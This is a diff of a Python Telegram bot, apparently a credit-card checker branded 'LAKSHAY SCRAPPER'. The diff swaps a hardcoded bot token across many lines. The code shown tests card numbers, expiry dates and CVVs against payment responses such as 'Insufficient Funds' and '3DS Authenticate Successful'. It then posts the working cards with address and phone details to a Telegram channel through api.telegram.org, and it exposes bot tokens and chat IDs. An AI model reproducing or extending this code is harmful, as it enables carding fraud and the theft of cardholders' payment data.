@@ -20,7 +20,7 @@ o= 'hmnmmmm'
 line='ok'
 card='ahhhhhhhhhhhhhhhhh'
 result='ahmahmahm'
-token = '7371222023:AAHBreBPEWKeoEC3OZYabLBACh5fWbGSsdQ'
+token = '7371222023:AAGBCzlxPFqv_wH15gc77v5gJaikVhm30KM'
 bot=telebot.TeleBot(token,parse_mode="HTML")
 admin=6574060333
 f = Faker()
@@ -361,7 +361,7 @@ def menu_callback(call):
 ◆ 𝑩𝒀: @lakshayfr
 ◆ 𝑻𝑨𝑲𝑬𝑵 ➜ {"{:.1f}".format(execution_time)} secounds .</b>'''
 					if 'success' in last:
-						tok = '7371222023:AAHBreBPEWKeoEC3OZYabLBACh5fWbGSsdQ'
+						tok = '7371222023:AAGBCzlxPFqv_wH15gc77v5gJaikVhm30KM'
 						acc =  '2201722670'
 						mg = f"""<b> 
 ❆═══» LAKSHAY 𝚂𝙲𝚁𝙰𝙿𝙿𝙴𝚁 «═══❆
@@ -382,7 +382,7 @@ def menu_callback(call):
 						ch += 1
 						bot.send_message(call.from_user.id, msg)
 					elif "funds" in last:
-						tok = '7371222023:AAHBreBPEWKeoEC3OZYabLBACh5fWbGSsdQ'
+						tok = '7371222023:AAGBCzlxPFqv_wH15gc77v5gJaikVhm30KM'
 						acc =  '-1002183834948'
 						mg = f"""<b> 
 ❆═══» LAKSHAY 𝚂𝙲𝚁𝙰𝙿𝙿𝙴𝚁 «═══❆
@@ -403,7 +403,7 @@ def menu_callback(call):
 						bot.send_message(call.from_user.id, msgf)
 						live+=1
 					elif "card's security" in last:
-						tok = '7371222023:AAHBreBPEWKeoEC3OZYabLBACh5fWbGSsdQ'
+						tok = '7371222023:AAGBCzlxPFqv_wH15gc77v5gJaikVhm30KM'
 						acc =  '-1002183834948'
 						mg = f"""<b> 
 ❆═══» LAKSHAY 𝚂𝙲𝚁𝙰𝙿𝙿𝙴𝚁 «═══❆
@@ -566,7 +566,7 @@ def menu_callback(call):
 						risk+=1
 						bot.send_message(call.from_user.id, risk)
 					elif 'CVV' in last:
-						tok = '7371222023:AAHBreBPEWKeoEC3OZYabLBACh5fWbGSsdQ'
+						tok = '7371222023:AAGBCzlxPFqv_wH15gc77v5gJaikVhm30KM'
 						acc =  '-1002183834948'
 						mg = f"""<b> 
 ❆═══» LAKSHAY 𝚂𝙲𝚁𝙰𝙿𝙿𝙴𝚁 «═══❆
@@ -779,7 +779,7 @@ Card: XXXXXXXXXXXXXXXX|MM|YYYY|CVV</b>''',parse_mode="HTML")
 ◆ 𝑩𝒀: @lakshayfr
 ◆ 𝑻𝑨𝑲𝑬𝑵 ➜ {"{:.1f}".format(execution_time)} secounds .</b>'''
 	if "Funds" in last or 'Invalid postal' in last or 'avs' in last or 'added' in last or 'Duplicate' in last or 'live' in last:
-		tok = '7371222023:AAHBreBPEWKeoEC3OZYabLBACh5fWbGSsdQ'
+		tok = '7371222023:AAGBCzlxPFqv_wH15gc77v5gJaikVhm30KM'
 		acc =  '-1002183834948'
 		mg = f"""<b> 
 ❆═══» LAKSHAY 𝚂𝙲𝚁𝙰𝙿𝙿𝙴𝚁 «═══❆
@@ -793,7 +793,7 @@ Card: XXXXXXXXXXXXXXXX|MM|YYYY|CVV</b>''',parse_mode="HTML")
 </b>"""
 		tlg = f"https://api.telegram.org/bot{tok}/sendMessage?chat_id={acc}&text={mg}"
 		tlg_params = {"parse_mode": "HTML"}
-		tok = '7371222023:AAHBreBPEWKeoEC3OZYabLBACh5fWbGSsdQ'
+		tok = '7371222023:AAGBCzlxPFqv_wH15gc77v5gJaikVhm30KM'
 		acb =  '-1002183834948'
 		mag = f"""<b>
 {cc}|{street}|{city}|{postal}|{phone}|UNITED STATES
@@ -984,7 +984,7 @@ Card: XXXXXXXXXXXXXXXX|MM|YYYY|CVV</b>''',parse_mode="HTML")
 ⸙ 𝙏𝙞𝙢𝙚 ➼ {"{:.1f}".format(execution_time)}
 ⸙ 𝗕𝗼𝘁 𝗕𝘆: @lakshayfr</b>'''
 	if "Funds" in last or 'Insufficient Funds' in last or 'avs' in last or '1000: Approved' in last or 'Duplicate' in last or 'Approved' in last:
-		tok = '7371222023:AAHBreBPEWKeoEC3OZYabLBACh5fWbGSsdQ'
+		tok = '7371222023:AAGBCzlxPFqv_wH15gc77v5gJaikVhm30KM'
 		acc =  '-1002183834948'
 		mg = f"""<b> 
 ❆═══» LAKSHAY 𝚂𝙲𝚁𝙰𝙿𝙿𝙴𝚁 «═══❆
@@ -998,7 +998,7 @@ Card: XXXXXXXXXXXXXXXX|MM|YYYY|CVV</b>''',parse_mode="HTML")
 </b>"""
 		tlg = f"https://api.telegram.org/bot{tok}/sendMessage?chat_id={acc}&text={mg}"
 		tlg_params = {"parse_mode": "HTML"}
-		tok = '7371222023:AAHBreBPEWKeoEC3OZYabLBACh5fWbGSsdQ'
+		tok = '7371222023:AAGBCzlxPFqv_wH15gc77v5gJaikVhm30KM'
 		acb =  '-1002183834948'
 		mag = f"""<b>
 {cc}|{street}|{city}|{postal}|{phone}|UNITED STATES
@@ -1220,7 +1220,7 @@ Card: XXXXXXXXXXXXXXXX|MM|YYYY|CVV</b>''',parse_mode="HTML")
 ◆ 𝑩𝒀: @lakshayfr
 ◆ 𝑻𝑨𝑲𝑬𝑵 ➜ {"{:.1f}".format(execution_time)} secounds .</b>'''
 	if 'success' in last:
-		tok = '7371222023:AAHBreBPEWKeoEC3OZYabLBACh5fWbGSsdQ'
+		tok = '7371222023:AAGBCzlxPFqv_wH15gc77v5gJaikVhm30KM'
 		acc =  '-1002183834948'
 		mg = f"""<b> 
 ❆═══» LAKSHAY 𝚂𝙲𝚁𝙰𝙿𝙿𝙴𝚁 «═══❆
@@ -1235,7 +1235,7 @@ Card: XXXXXXXXXXXXXXXX|MM|YYYY|CVV</b>''',parse_mode="HTML")
 </b>"""
 		tlg = f"https://api.telegram.org/bot{tok}/sendMessage?chat_id={acc}&text={mg}"
 		tlg_params = {"parse_mode": "HTML"}
-		tok = '7371222023:AAHBreBPEWKeoEC3OZYabLBACh5fWbGSsdQ'
+		tok = '7371222023:AAGBCzlxPFqv_wH15gc77v5gJaikVhm30KM'
 		acb =  '-1002183834948'
 		mag = f"""<b>
 {cc}|{street}|{city}|{postal}|{phone}|UNITED STATES
@@ -1246,7 +1246,7 @@ Card: XXXXXXXXXXXXXXXX|MM|YYYY|CVV</b>''',parse_mode="HTML")
 		i = requests.post(tlg, params=tlg_params)
 		bot.edit_message_text(chat_id=message.chat.id, message_id=ko, text=msg)
 	elif "funds" in last:
-		tok = '7371222023:AAHBreBPEWKeoEC3OZYabLBACh5fWbGSsdQ'
+		tok = '7371222023:AAGBCzlxPFqv_wH15gc77v5gJaikVhm30KM'
 		acc =  '-1002183834948'
 		mg = f"""<b> 
 ❆═══» LAKSHAY 𝚂𝙲𝚁𝙰𝙿𝙿𝙴𝚁 «═══❆
@@ -1261,7 +1261,7 @@ Card: XXXXXXXXXXXXXXXX|MM|YYYY|CVV</b>''',parse_mode="HTML")
 </b>"""
 		tlg = f"https://api.telegram.org/bot{tok}/sendMessage?chat_id={acc}&text={mg}"
 		tlg_params = {"parse_mode": "HTML"}
-		tok = '7371222023:AAHBreBPEWKeoEC3OZYabLBACh5fWbGSsdQ'
+		tok = '7371222023:AAGBCzlxPFqv_wH15gc77v5gJaikVhm30KM'
 		acb =  '-1002183834948'
 		mag = f"""<b>
 {cc}|{street}|{city}|{postal}|{phone}|UNITED STATES
@@ -1272,7 +1272,7 @@ Card: XXXXXXXXXXXXXXXX|MM|YYYY|CVV</b>''',parse_mode="HTML")
 		i = requests.post(tlg, params=tlg_params)
 		bot.edit_message_text(chat_id=message.chat.id, message_id=ko, text=msgf)
 	elif "card's security" in last:
-		tok = '7371222023:AAHBreBPEWKeoEC3OZYabLBACh5fWbGSsdQ'
+		tok = '7371222023:AAGBCzlxPFqv_wH15gc77v5gJaikVhm30KM'
 		acc =  '-1002183834948'
 		mg = f"""<b> 
 ❆═══» LAKSHAY 𝚂𝙲𝚁𝙰𝙿𝙿𝙴𝚁 «═══❆
@@ -1287,7 +1287,7 @@ Card: XXXXXXXXXXXXXXXX|MM|YYYY|CVV</b>''',parse_mode="HTML")
 </b>"""
 		tlg = f"https://api.telegram.org/bot{tok}/sendMessage?chat_id={acc}&text={mg}"
 		tlg_params = {"parse_mode": "HTML"}
-		tok = '7371222023:AAHBreBPEWKeoEC3OZYabLBACh5fWbGSsdQ'
+		tok = '7371222023:AAGBCzlxPFqv_wH15gc77v5gJaikVhm30KM'
 		acb =  '-1002183834948'
 		mag = f"""<b>
 {cc}|{street}|{city}|{postal}|{phone}|UNITED STATES
@@ -1541,7 +1541,7 @@ Card: XXXXXXXXXXXXXXXX|MM|YYYY|CVV</b>''',parse_mode="HTML")
 ◆ 𝑩𝒀: @lakshayfr
 ◆ 𝑻𝑨𝑲𝑬𝑵 ➜ {"{:.1f}".format(execution_time)} secounds .</b>'''
 	if 'Authenticate Attempt Successful' in last or 'Authenticate Successful' in last or 'authenticate_successful' in last:
-		tok = '7371222023:AAHBreBPEWKeoEC3OZYabLBACh5fWbGSsdQ'
+		tok = '7371222023:AAGBCzlxPFqv_wH15gc77v5gJaikVhm30KM'
 		acc =  '-1002183834948'
 		mg = f"""<b> 
 ❆═══lakshay 𝚂𝙲𝚁𝙰𝙿𝙿𝙴𝚁═══❆
@@ -1555,7 +1555,7 @@ Card: XXXXXXXXXXXXXXXX|MM|YYYY|CVV</b>''',parse_mode="HTML")
 </b>"""
 		tlg = f"https://api.telegram.org/bot{tok}/sendMessage?chat_id={acc}&text={mg}"
 		tlg_params = {"parse_mode": "HTML"}
-		tok = '7371222023:AAHBreBPEWKeoEC3OZYabLBACh5fWbGSsdQ'
+		tok = '7371222023:AAGBCzlxPFqv_wH15gc77v5gJaikVhm30KM'
 		acb =  '-1002183834948'
 		mag = f"""<b>
 {cc}|{street}|{city}|{postal}|{phone}|UNITED STATES
